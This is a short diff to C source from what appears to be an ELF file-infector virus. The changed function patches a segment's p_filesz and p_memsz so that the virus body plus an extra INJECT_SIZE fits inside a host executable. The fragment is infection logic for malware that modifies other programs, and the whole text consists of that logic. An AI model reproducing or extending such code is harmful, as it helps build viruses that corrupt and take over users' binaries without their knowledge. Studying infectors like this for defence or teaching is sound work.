@@ -8,11 +8,11 @@ void		*update_segment_sz(void *src, void **dst, Elf64_Phdr *segment, t_elf *viru
 	memcpy(*dst, src, (unsigned long)&segment->p_filesz - (unsigned long)src);
 	*dst += (unsigned long)&segment->p_filesz - (unsigned long)src;
 	src = &segment->p_filesz;
-	p_filesz = segment->p_filesz + virus_elf->size;
+	p_filesz = segment->p_filesz + virus_elf->size + INJECT_SIZE;
 	memcpy(*dst, &p_filesz, sizeof(segment->p_filesz));
 	*dst += sizeof(segment->p_filesz);
 	src += sizeof(segment->p_filesz);
-	p_memsz = segment->p_memsz + virus_elf->size;
+	p_memsz = segment->p_memsz + virus_elf->size + INJECT_SIZE;
 	memcpy(*dst, &p_memsz, sizeof(segment->p_memsz));
 	*dst += sizeof(segment->p_memsz);
 	src += sizeof(segment->p_memsz);
